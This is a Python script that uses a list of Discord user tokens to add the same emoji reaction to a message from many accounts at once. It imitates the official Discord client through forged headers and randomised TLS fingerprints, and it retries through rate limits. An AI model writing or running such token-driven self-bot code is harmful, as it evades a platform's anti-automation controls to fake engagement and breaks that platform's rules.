from tls_client import Session
import random
import time
import datetime
import threading
from colorama import Fore

GREEN = Fore.GREEN
RED = Fore.RED
BLUE = Fore.LIGHTBLUE_EX
YELLOW = Fore.YELLOW

def add_emoji(token, channel, message, emoji):
    headers = {
        'authority': 'discord.com',
        'accept': '*/*',
        'accept-language': 'sv,sv-SE;q=0.9',
        'content-type': 'application/json',
        'origin': 'https://discord.com',
        'referer': 'https://discord.com/',
        'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9016 Chrome/108.0.5359.215 Electron/22.3.12 Safari/537.36',
        'x-debug-options': 'bugReporterEnabled',
        'x-discord-locale': 'sv-SE',
        'x-discord-timezone': 'Europe/Stockholm',
        'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDE2Iiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDUiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InN2IiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV09XNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIGRpc2NvcmQvMS4wLjkwMTYgQ2hyb21lLzEwOC4wLjUzNTkuMjE1IEVsZWN0cm9uLzIyLjMuMTIgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjIyLjMuMTIiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyMTg2MDQsIm5hdGl2ZV9idWlsZF9udW1iZXIiOjM1MjM2LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==',
    }

    session = Session(
        client_identifier=f"chrome_{random.randint(110, 115)}",
        random_tls_extension_order=True
    )
    session.headers.update(headers)
    session.headers.update({"Authorization": token})
    site = session.get("https://discord.com")
    session.cookies = site.cookies

    params = {
        "location": "Message",
        "type": "0",
    }
    response = session.put(
        f"https://canary.discord.com/api/v10/channels/{channel}/messages/{message}/reactions/{emoji}/%40me",
        params=params,
    )

    return response
def react_emoji(tokens):
    if isinstance(tokens, str):
        tokens = [tokens]
    else:
        tokens = tokens
    
    message = input("message url > ")

    channel_id = message.split("/")[5]
    message_id = message.split("/")[6]
    emojis = []

    headers = {
        'authority': 'discord.com',
        'accept': '*/*',
        'accept-language': 'sv,sv-SE;q=0.9',
        'content-type': 'application/json',
        'origin': 'https://discord.com',
        'referer': 'https://discord.com/',
        'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9016 Chrome/108.0.5359.215 Electron/22.3.12 Safari/537.36',
        'x-debug-options': 'bugReporterEnabled',
        'x-discord-locale': 'sv-SE',
        'x-discord-timezone': 'Europe/Stockholm',
        'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDE2Iiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDUiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InN2IiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV09XNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIGRpc2NvcmQvMS4wLjkwMTYgQ2hyb21lLzEwOC4wLjUzNTkuMjE1IEVsZWN0cm9uLzIyLjMuMTIgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjIyLjMuMTIiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyMTg2MDQsIm5hdGl2ZV9idWlsZF9udW1iZXIiOjM1MjM2LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==',
    }

    params = {"around": message_id, "limit": 50}
    session = Session(
        client_identifier=f"chrome_{random.randint(110, 115)}",
        random_tls_extension_order=True
    )
    session.headers.update(headers)

    for token in tokens:
        session.headers.update({"Authorization": token})
        site = session.get("https://discord.com")
        session.cookies = site.cookies
        response = session.get(f"https://discord.com/api/v10/channels/{channel_id}/messages", params=params)
        if response.status_code == 200:
            data = response.json()
    for i in data:
        if i["id"] == message_id:
            reactions = i["reactions"]
            for emoji in reactions:
                if emoji:
                    emoji_id = emoji["emoji"]["id"]
                    emoji_name = emoji["emoji"]["name"]

                    if emoji_id is None:
                        emojis.append(emoji_name)
                    else:
                        emojis.append(f"{emoji_name}:{emoji_id}")
                else:
                    print(f"{RED}[-] cant find any reaction in that message :(")
                
    for i, emoji in enumerate(emojis, start=1):
        print(f"{i} : {emoji}")

    choice = input(f"choice > ")
    selected = emojis[int(choice) -1]

    def add_react(token):
        while True:
            response = add_emoji(token, channel_id, message_id, selected)
            if response.status_code == 204:
                print(f"{GREEN}[+] Success")
                break
            elif response.status_code == 429:
                print(f"{YELLOW}[!] ratelimited | {datetime.datetime.now()}")
                retry_after = int(response.headers.get('retry-after', 5)) + 5
                print(f"{YELLOW}[!] Sleeping for {retry_after} seconds")
                time.sleep(retry_after)
    threads = []
    for t in tokens:
        thread = threading.Thread(target=add_react, args=(t,))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()
